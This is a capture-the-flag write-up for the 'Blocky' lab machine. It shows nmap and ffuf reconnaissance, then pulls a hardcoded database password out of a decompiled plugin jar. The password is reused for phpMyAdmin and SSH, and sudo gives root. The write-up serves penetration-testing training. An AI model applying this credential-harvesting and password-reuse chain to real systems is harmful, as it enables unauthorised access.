# Blocky 

## Nmap scanning 

```

sudo nmap -Pn -sS -sC  10.10.10.37
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 16:35 EDT
Nmap scan report for 10.10.10.37
Host is up (0.43s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http
|_http-generator: WordPress 4.8
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos

Nmap done: 1 IP address (1 host up) scanned in 108.43 seconds
```

## Fuzzing directories

```

ffuf -u http://10.10.10.37/FUZZ -w /usr/share/wordlists/dirb/common.txt:FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.37/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12]
                        [Status: 200, Size: 52256, Words: 3306, Lines: 314]
.hta                    [Status: 403, Size: 290, Words: 22, Lines: 12]
phpmyadmin              [Status: 301, Size: 315, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 312, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
wiki                    [Status: 301, Size: 309, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 313, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 316, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 315, Words: 20, Lines: 10]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
:: Progress: [4614/4614] :: Job [1/1] :: 81 req/sec :: Duration: [0:06:29] :: Errors: 554 ::
```

in __/plugins__ there are two jar file, download both 

## Java Decompiler

unzip BlockyCore.jar 

use __jd_gui__ to check the BlockyCore.class

```

  public String sqlHost = "localhost";
  public String sqlUser = "root";
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```

use this to __log in__ to __phpmyadmin__

In the localhost database ` wordpress ` and within  ` wp_user ` table, we got a username `notch` 

from another table `wp_usermeta` we can confirm that notch has sysadmin capabilities

## Gaining Access and Exploitation

perform ssh using username `notch ` and the password we used to log into phpmyadmin

```

ssh notch@10.10.10.37 
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Sun Dec 24 09:34:35 2017
notch@Blocky:~$
```

we got logged in it, lets find user and root txt file

```

notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt
********************************notch@Blocky:~$ cd /root
-bash: cd: /root: Permission denied
```

## Privilege escalation

```

notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL

notch@Blocky:~$ sudo -i
root@Blocky:~# cd /root
root@Blocky:~# cat root.txt
********************************root@Blocky:~# 
```
